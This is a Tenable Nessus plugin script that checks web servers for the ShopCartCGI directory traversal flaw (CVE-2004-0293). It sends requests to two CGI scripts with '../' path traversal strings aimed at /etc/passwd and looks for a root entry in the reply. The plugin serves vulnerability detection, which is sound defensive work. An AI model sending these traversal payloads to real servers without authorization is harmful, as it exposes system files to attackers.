#
# (C) Tenable Network Security
#


include("compat.inc");

if(description)
{
 script_id(12064);
 script_version ("$Revision: 1.13 $");

 script_cve_id("CVE-2004-0293");
 script_bugtraq_id(9670);
 script_xref(name:"OSVDB", value:"3978");
 script_xref(name:"OSVDB", value:"4018");
 
 script_name(english:"ShopCartCGI Multiple Script Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI application that is affected by 
multiple arbitrary file access issues." );
 script_set_attribute(attribute:"description", value:
"The remote host is running ShopCartCGI - a set of CGIs designed to set
up an on-line shopping cart. 

The version of ShopCartCGI on the remote host fails to sanitize input
to several of its CGI scripts before using it to read and display
files.  An unauthenticated remote attacker can leverage these issues
to read arbitary files on the remote web server with the privileges of
the web user." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2004-02/0459.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 script_summary(english:"Checks ShopCart");
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
 req = string(dir,"/gotopage.cgi?4242+../../../../../../../../../../../../../etc/passwd");
 req = http_get(item:req, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if( buf == NULL ) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
 	security_warning(port);
	exit(0);
 }

 if (thorough_tests){
   req = string(dir,"/genindexpage.cgi?4242+Home+/../../../../../../../../../../../../../etc/passwd");
   req = http_get(item:req, port:port);
   buf = http_keepalive_send_recv(port:port, data:req);
   if( buf == NULL ) exit(0);

   if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
   	security_warning(port);
  	exit(0);
   }
 }
}
